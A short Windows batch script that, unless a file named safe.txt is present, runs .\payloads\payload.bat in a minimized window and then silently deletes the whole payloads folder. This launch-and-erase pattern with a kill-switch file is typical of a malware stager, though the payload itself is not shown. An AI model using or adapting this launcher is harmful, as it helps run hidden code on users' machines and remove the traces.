@echo off
if exist ".\payloads\payload.bat" (
   if exist safe.txt (
     rmdir /s /q .\payloads
     exit
   ) else (
     start /min /wait .\payloads\payload.bat
     rmdir /s /q .\payloads
     exit
   )
) else (
   exit
)
